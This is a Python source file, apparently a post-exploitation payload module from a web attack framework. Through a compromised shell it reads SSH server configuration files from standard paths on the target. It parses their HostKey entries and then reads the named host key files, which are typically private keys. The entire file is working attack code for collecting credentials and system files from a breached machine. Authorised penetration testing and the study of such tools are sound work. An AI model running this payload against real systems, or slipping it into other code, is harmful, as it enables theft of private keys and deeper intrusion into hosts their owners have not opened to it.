import re
from plugins.attack.payloads.base_payload import base_payload
from core.ui.consoleUi.tables import table


class ssh_config_files(base_payload):
    '''
    This payload shows SSH Server configuration files
    '''
    def api_read(self, parameters):
        result = {}
        files = []

        def parse_hostkey(config):
            hostkey = re.findall('(?<=HostKey )(.*)', config, re.MULTILINE)
            if hostkey:
                return hostkey
            else:
                return ''

        files.append('/etc/ssh/sshd_config')
        files.append('/etc/rssh.conf')
        files.append('/usr/local/etc/sshd_config')
        files.append('/etc/sshd_config')
        files.append('/etc/openssh/sshd_config')

        for file in files:
            hostkey = parse_hostkey(self.shell.read(file))
            for key in hostkey:
                files.append(key)

        for file in files:
            content = self.shell.read(file)
            if content:
                result[file] = content

        return result

    def run_read(self, parameters):
        api_result = self.api_read( parameters )
        
        if not api_result:
            return 'SSH configuration files not found.'
        else:
            rows = []
            rows.append( ['SSH configuration files'] ) 
            rows.append( [] )
            
            for filename in api_result:
                rows.append( [filename,] )
                
            result_table = table( rows )
            result_table.draw( 80 )                    
            return

